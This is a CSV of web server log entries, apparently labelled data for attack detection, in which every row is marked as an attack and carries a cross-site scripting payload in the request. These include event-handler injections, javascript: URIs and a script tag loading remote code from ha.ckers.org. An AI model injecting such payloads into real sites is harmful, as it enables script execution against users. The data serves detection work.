"","ip","date","hour","minute","seconds","zone","request1","request2","status","respsize","url","computer","attaque"
"11","192.108.116.88","18/Dec/2017","13","04","57","+0000","GET ","img/logo.png HTTP/1.1/datalab '';!--""<XSS>=&{()} ",304,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 12",1
"12","192.108.116.88","18/Dec/2017","13","05","16","+0000","GET "," HTTP/1.1/NA/datalab 0\""autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>""-confirm(3)- ",200,1040,NA,"Mozilla/5.0",1
"13","192.108.116.88","18/Dec/2017","13","05","16","+0000","GET ","css/index.css HTTP/1.1/datalab 0\""autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>""-confirm(3)- ",200,945,"http://31.14.135.81:3000/","Mozilla/5.0",1
"14","192.108.116.88","18/Dec/2017","13","05","16","+0000","GET ","img/logo.png HTTP/1.1/datalab 0\""autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>""-confirm(3)- ",200,34463,"http://31.14.135.81:3000/","Mozilla/5.0",1
"15","192.108.116.88","18/Dec/2017","13","05","16","+0000","POST ","datalab HTTP/1.1/NA/datalab 0\""autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>""-confirm(3)- ",200,1073,"http://31.14.135.81:3000/","Mozilla/5.0",1
"16","192.108.116.88","18/Dec/2017","13","05","16","+0000","GET ","img/logo.png HTTP/1.1/datalab 0\""autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>""-confirm(3)- ",304,NA,"http://31.14.135.81:3000/","Mozilla/5.0",1
"17","192.108.116.88","18/Dec/2017","13","05","16","+0000","GET ","css/index.css HTTP/1.1/datalab 0\""autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>""-confirm(3)- ",304,NA,"http://31.14.135.81:3000/","Mozilla/5.0",1
"18","192.108.116.88","18/Dec/2017","13","05","38","+0000","GET "," HTTP/1.1/NA/datalab <script/src=data:,alert()> ",200,1040,NA,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 50",1
"19","192.108.116.88","18/Dec/2017","13","05","38","+0000","GET ","css/index.css HTTP/1.1/datalab <script/src=data:,alert()> ",200,945,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 2",1
"20","192.108.116.88","18/Dec/2017","13","05","38","+0000","GET ","img/logo.png HTTP/1.1/datalab <script/src=data:,alert()> ",200,34463,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 4",1
"21","192.108.116.88","18/Dec/2017","13","05","39","+0000","POST ","datalab HTTP/1.1/NA/datalab <script/src=data:,alert()> ",200,1073,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 179",1
"22","192.108.116.88","18/Dec/2017","13","05","39","+0000","GET ","css/index.css HTTP/1.1/datalab <script/src=data:,alert()> ",304,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 1",1
"23","192.108.116.88","18/Dec/2017","13","05","39","+0000","GET ","img/logo.png HTTP/1.1/datalab <script/src=data:,alert()> ",304,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 1",1
"24","192.108.116.88","18/Dec/2017","13","06","03","+0000","GET "," HTTP/1.1/NA/datalab <marquee/onstart=alert()> ",200,1040,NA,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 21",1
"25","192.108.116.88","18/Dec/2017","13","06","03","+0000","GET ","css/index.css HTTP/1.1/datalab <marquee/onstart=alert()> ",200,945,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 57",1
"26","192.108.116.88","18/Dec/2017","13","06","03","+0000","GET ","img/logo.png HTTP/1.1/datalab <marquee/onstart=alert()> ",200,34463,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 9",1
"27","192.108.116.88","18/Dec/2017","13","06","03","+0000","POST ","datalab HTTP/1.1/NA/datalab <marquee/onstart=alert()> ",200,1073,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 221",1
"28","192.108.116.88","18/Dec/2017","13","06","04","+0000","GET ","css/index.css HTTP/1.1/datalab <marquee/onstart=alert()> ",304,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 2",1
"29","192.108.116.88","18/Dec/2017","13","06","04","+0000","GET ","img/logo.png HTTP/1.1/datalab <marquee/onstart=alert()> ",304,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 2",1
"30","192.108.116.88","18/Dec/2017","13","06","26","+0000","GET "," HTTP/1.1/NA/datalab <video/poster/onerror=alert()> ",200,1040,NA,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 56",1
"31","192.108.116.88","18/Dec/2017","13","06","26","+0000","GET ","css/index.css HTTP/1.1/datalab <video/poster/onerror=alert()> ",200,945,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 21",1
"32","192.108.116.88","18/Dec/2017","13","06","26","+0000","GET ","img/logo.png HTTP/1.1/datalab <video/poster/onerror=alert()> ",200,34463,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 7",1
"33","192.108.116.88","18/Dec/2017","13","06","27","+0000","POST ","datalab HTTP/1.1/NA/datalab <video/poster/onerror=alert()> ",200,1073,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 232",1
"34","192.108.116.88","18/Dec/2017","13","06","27","+0000","GET ","css/index.css HTTP/1.1/datalab <video/poster/onerror=alert()> ",304,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 0",1
"35","192.108.116.88","18/Dec/2017","13","06","27","+0000","GET ","img/logo.png HTTP/1.1/datalab <video/poster/onerror=alert()> ",304,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 0",1
"36","192.108.116.88","18/Dec/2017","13","06","45","+0000","GET "," HTTP/1.1/NA/datalab <isindex/autofocus/onfocus=alert()> ",200,1040,NA,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 2",1
"37","192.108.116.88","18/Dec/2017","13","06","45","+0000","GET ","css/index.css HTTP/1.1/datalab <isindex/autofocus/onfocus=alert()> ",200,945,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 1",1
"38","192.108.116.88","18/Dec/2017","13","06","45","+0000","GET ","img/logo.png HTTP/1.1/datalab <isindex/autofocus/onfocus=alert()> ",200,34463,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 1",1
"39","192.108.116.88","18/Dec/2017","13","06","46","+0000","POST ","datalab HTTP/1.1/NA/datalab <isindex/autofocus/onfocus=alert()> ",200,1073,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 172",1
"40","192.108.116.88","18/Dec/2017","13","06","46","+0000","GET ","img/logo.png HTTP/1.1/datalab <isindex/autofocus/onfocus=alert()> ",304,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 13",1
"41","192.108.116.88","18/Dec/2017","13","06","46","+0000","GET ","css/index.css HTTP/1.1/datalab <isindex/autofocus/onfocus=alert()> ",304,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 5",1
"42","192.108.116.88","18/Dec/2017","13","07","06","+0000","GET "," HTTP/1.1/NA/datalab <SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT> ",200,1040,NA,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 2",1
"43","192.108.116.88","18/Dec/2017","13","07","06","+0000","GET ","css/index.css HTTP/1.1/datalab <SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT> ",200,945,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 1",1
"44","192.108.116.88","18/Dec/2017","13","07","06","+0000","GET ","img/logo.png HTTP/1.1/datalab <SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT> ",200,34463,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 1",1
"45","192.108.116.88","18/Dec/2017","13","07","07","+0000","POST ","datalab HTTP/1.1/NA/datalab <SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT> ",200,1073,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 170",1
"46","192.108.116.88","18/Dec/2017","13","07","07","+0000","GET ","css/index.css HTTP/1.1/datalab <SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT> ",304,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 0",1
"47","192.108.116.88","18/Dec/2017","13","07","07","+0000","GET ","img/logo.png HTTP/1.1/datalab <SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT> ",304,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 4",1
"48","192.108.116.88","18/Dec/2017","13","07","24","+0000","GET "," HTTP/1.1/NA/datalab <IMG SRC=""javascript:alert('XSS');""> ",200,1040,NA,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 2",1
"49","192.108.116.88","18/Dec/2017","13","07","24","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG SRC=""javascript:alert('XSS');""> ",200,945,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 1",1
"50","192.108.116.88","18/Dec/2017","13","07","24","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG SRC=""javascript:alert('XSS');""> ",200,34463,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 1",1
"51","192.108.116.88","18/Dec/2017","13","09","24","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC=""javascript:alert('XSS');""> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"52","192.108.116.88","18/Dec/2017","13","11","25","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC=""javascript:alert('XSS');""> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"53","192.108.116.88","18/Dec/2017","13","11","47","+0000","GET "," HTTP/1.1/NA/datalab <IMG SRC=javascript:alert('XSS')> ",200,1040,NA,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 22",1
"54","192.108.116.88","18/Dec/2017","13","11","47","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG SRC=javascript:alert('XSS')> ",200,945,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 67",1
"55","192.108.116.88","18/Dec/2017","13","11","47","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG SRC=javascript:alert('XSS')> ",200,34463,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 30",1
"56","192.108.116.88","18/Dec/2017","13","13","47","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC=javascript:alert('XSS')> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"57","192.108.116.88","18/Dec/2017","13","15","48","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC=javascript:alert('XSS')> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"58","192.108.116.88","18/Dec/2017","13","32","21","+0000","GET "," HTTP/1.1/NA/datalab <IMG SRC=""javascript:alert('XSS');""> ",200,1040,NA,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 55",1
"59","192.108.116.88","18/Dec/2017","13","32","21","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG SRC=""javascript:alert('XSS');""> ",200,945,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 65",1
"60","192.108.116.88","18/Dec/2017","13","32","21","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG SRC=""javascript:alert('XSS');""> ",200,34463,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 59",1
"61","192.108.116.88","18/Dec/2017","13","34","21","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC=""javascript:alert('XSS');""> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"62","192.108.116.88","18/Dec/2017","13","36","21","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC=""javascript:alert('XSS');""> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"63","192.108.116.88","18/Dec/2017","13","36","46","+0000","GET "," HTTP/1.1/NA/datalab <IMG SRC=javascript:alert('XSS')> ",200,1040,NA,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 1",1
"64","192.108.116.88","18/Dec/2017","13","36","46","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG SRC=javascript:alert('XSS')> ",200,945,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 1",1
"65","192.108.116.88","18/Dec/2017","13","36","47","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG SRC=javascript:alert('XSS')> ",200,34463,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 815",1
"66","192.108.116.88","18/Dec/2017","13","38","46","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC=javascript:alert('XSS')> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"67","192.108.116.88","18/Dec/2017","13","40","46","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC=javascript:alert('XSS')> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"68","192.108.116.88","18/Dec/2017","13","41","11","+0000","GET "," HTTP/1.1/NA/datalab <IMG SRC=JaVaScRiPt:alert('XSS')> ",200,1040,NA,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 18",1
"69","192.108.116.88","18/Dec/2017","13","41","11","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG SRC=JaVaScRiPt:alert('XSS')> ",200,945,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 4",1
"70","192.108.116.88","18/Dec/2017","13","41","11","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG SRC=JaVaScRiPt:alert('XSS')> ",200,34463,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 2",1
"71","192.108.116.88","18/Dec/2017","13","43","11","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC=JaVaScRiPt:alert('XSS')> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"72","192.108.116.88","18/Dec/2017","13","45","11","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC=JaVaScRiPt:alert('XSS')> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"73","192.108.116.88","18/Dec/2017","13","45","26","+0000","GET "," HTTP/1.1/NA/datalab <IMG SRC=javascript:alert(""XSS"")> ",200,1040,NA,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 49",1
"74","192.108.116.88","18/Dec/2017","13","45","27","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG SRC=javascript:alert(""XSS"")> ",200,945,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 4",1
"75","192.108.116.88","18/Dec/2017","13","45","27","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG SRC=javascript:alert(""XSS"")> ",200,34463,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 10",1
"76","192.108.116.88","18/Dec/2017","13","45","28","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC=javascript:alert(""XSS"")> ",200,1073,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 224",1
"77","192.108.116.88","18/Dec/2017","13","45","28","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG SRC=javascript:alert(""XSS"")> ",304,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 2",1
"78","192.108.116.88","18/Dec/2017","13","45","28","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG SRC=javascript:alert(""XSS"")> ",304,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 24",1
